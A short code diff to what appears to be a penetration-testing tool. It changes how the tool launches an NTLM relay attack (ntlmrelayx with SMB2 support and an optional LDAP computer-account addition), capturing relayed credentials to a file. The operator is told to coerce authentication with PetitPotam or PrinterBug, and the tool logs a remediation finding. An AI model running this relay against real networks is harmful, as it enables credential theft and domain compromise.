@@ -46,8 +46,19 @@ def run():
         elif action in ("ldap", "ldaps"):
             extra = "--add-computer"
             info("Will attempt to add a computer account via LDAP relay")
-        run_cmd(f"{imp('ntlmrelayx.py')} -tf {targets} -smb2support {extra} --output-file /tmp/relay_creds.txt")
-        info("In second terminal, trigger auth with PetitPotam/PrinterBug/Responder")
+        import subprocess as _sp
+        _tty_out = open("/dev/tty", "w")
+        _tty_in  = open("/dev/tty", "r")
+        info("Starting ntlmrelayx — trigger auth with PetitPotam/PrinterBug in another terminal")
+        _cmd = f"{imp('ntlmrelayx.py')} -tf {targets} -smb2support {extra} --output-file /tmp/relay_creds.txt"
+        _proc = _sp.Popen(_cmd, shell=True, stdin=_tty_in, stdout=_tty_out, stderr=_tty_out)
+        try:
+            _proc.wait()
+        except KeyboardInterrupt:
+            _proc.terminate()
+        finally:
+            _tty_out.close()
+            _tty_in.close()
         add_finding("NTLM Relay Attack", "Critical",
                     f"NTLM relay to {targets} via {action}",
                     "Enforce SMB signing; disable NTLM where possible")
